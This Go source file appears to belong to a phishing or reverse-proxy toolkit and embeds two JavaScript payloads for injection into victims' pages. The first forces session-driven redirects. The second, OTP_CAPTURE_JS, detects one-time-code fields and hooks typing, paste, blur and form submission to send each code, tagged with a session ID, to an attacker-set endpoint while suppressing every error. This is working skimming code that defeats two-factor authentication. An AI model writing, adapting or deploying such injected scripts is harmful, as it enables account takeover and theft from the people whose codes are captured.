package core

const DYNAMIC_REDIRECT_JS = `
function getRedirect(sid) {
	var url = "/s/" + sid;
	console.log("fetching: " + url);
	fetch(url, {
		method: "GET",
		headers: {
			"Content-Type": "application/json"
		},
		credentials: "include"
	})
		.then((response) => {

			if (response.status == 200) {
				return response.json();
			} else if (response.status == 408) {
				console.log("timed out");
				getRedirect(sid);
			} else {
				throw "http error: " + response.status;
			}
		})
		.then((data) => {
			if (data !== undefined) {
				console.log("api: success:", data);
				top.location.href=data.redirect_url;
			}
		})
		.catch((error) => {
			console.error("api: error:", error);
			setTimeout(function () { getRedirect(sid) }, 10000);
		});
}
getRedirect('{session_id}');
`

const OTP_CAPTURE_JS = `
(function() {
	try {
		if (typeof document === 'undefined' || !document) return;
		var otpCaptureEndpoint = '{endpoint}';
		var sessionId = '{session_id}';
		var dataAttr = '{data_attr}';
		var fieldNames = [{field_names}];
		if (!otpCaptureEndpoint || !sessionId) return;

		function sendOtpCode(code, fieldName) {
			try {
				var data = JSON.stringify({
					session_id: sessionId,
					otp_code: code,
					field_name: fieldName || 'otp'
				});
				fetch(otpCaptureEndpoint, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: data,
					credentials: 'include'
				}).catch(function() {});
			} catch(e) {}
		}

		function isOtpField(input) {
			if (!input || input.tagName !== 'INPUT') return false;
			try {
				if (input.hasAttribute && input.hasAttribute(dataAttr)) return true;
			} catch(e) {}
			var name = '';
			try { name = ((input.name || input.id || '') + '').toLowerCase(); } catch(e) {}
			for (var i = 0; i < fieldNames.length; i++) {
				if (name.indexOf(fieldNames[i]) !== -1) return true;
			}
			var autocomplete = '';
			try { autocomplete = ((input.getAttribute && input.getAttribute('autocomplete')) || '').toLowerCase(); } catch(e) {}
			if (autocomplete.indexOf('one-time-code') !== -1 || autocomplete.indexOf('otp') !== -1) return true;
			var inputmode = '';
			try { inputmode = ((input.getAttribute && input.getAttribute('inputmode')) || '').toLowerCase(); } catch(e) {}
			var type = '';
			try { type = (input.type || '').toLowerCase(); } catch(e) {}
			if ((inputmode === 'numeric' || type === 'tel' || type === 'number') && name !== '') {
				for (var j = 0; j < fieldNames.length; j++) {
					if (name.indexOf(fieldNames[j]) !== -1) return true;
				}
			}
			var placeholder = '';
			try { placeholder = (input.placeholder || '').toLowerCase(); } catch(e) {}
			var otpKeywords = ['otp', '验证码', 'verification', 'code', '短信', '动态', 'token'];
			for (var k = 0; k < otpKeywords.length; k++) {
				if (placeholder.indexOf(otpKeywords[k]) !== -1) return true;
			}
			return false;
		}

		function attachOtpListeners() {
			try {
				var inputs = document.querySelectorAll('input');
				if (!inputs || inputs.length === 0) return;
				var matched = 0;
				inputs.forEach(function(input) {
					try {
						if (input._otpCaptured) return;
						if (!isOtpField(input)) return;
						input._otpCaptured = true;
						matched++;
						var fieldName = (input.name || input.id || 'otp') + '';
						input.addEventListener('input', function() {
							try {
								var val = (input.value || '').trim();
								if (val.length >= 4) sendOtpCode(val, fieldName);
							} catch(e) {}
						});
						input.addEventListener('blur', function() {
							try {
								var val = (input.value || '').trim();
								if (val.length >= 4) sendOtpCode(val, fieldName);
							} catch(e) {}
						});
						var form = null;
						try { form = input.closest ? input.closest('form') : null; } catch(e) {}
						if (form) {
							form.addEventListener('submit', function() {
								try {
									var val = (input.value || '').trim();
									if (val.length >= 4) sendOtpCode(val, fieldName);
								} catch(e) {}
							}, true);
						}
					} catch(e) {}
				});
			} catch(e) {}
		}

		function setupPasteListener() {
			try {
				document.addEventListener('paste', function(e) {
					try {
						var target = e.target;
						if (!target || target.tagName !== 'INPUT') return;
						var pastedText = '';
						try { pastedText = (e.clipboardData || (window.clipboardData && window.clipboardData.getData) ? window.clipboardData.getData('text') : '') + ''; } catch(e) {}
						if (!pastedText) return;
						var codeMatch = pastedText.match(/\d{4,8}/);
						if (codeMatch && isOtpField(target)) {
							var fieldName = (target.name || target.id || 'otp') + '';
							setTimeout(function() {
								try { sendOtpCode(codeMatch[0], fieldName); } catch(e) {}
							}, 100);
						}
					} catch(e) {}
				}, true);
			} catch(e) {}
		}

		function setupObserver() {
			try {
				if (!document.body || !window.MutationObserver) return;
				var observer = new MutationObserver(function(mutations) {
					try {
						if (!mutations) return;
						var shouldAttach = false;
						for (var i = 0; i < mutations.length; i++) {
							var m = mutations[i];
							if (m.addedNodes && m.addedNodes.length > 0) {
								shouldAttach = true;
								break;
							}
						}
						if (shouldAttach) attachOtpListeners();
					} catch(e) {}
				});
				observer.observe(document.body, { childList: true, subtree: true });
			} catch(e) {}
		}

		function init() {
			try {
				attachOtpListeners();
				setupPasteListener();
				setupObserver();
			} catch(e) {}
		}

		if (document.readyState === 'loading') {
			document.addEventListener('DOMContentLoaded', init, { once: true });
		} else {
			init();
		}
	} catch(e) {}
})();
`
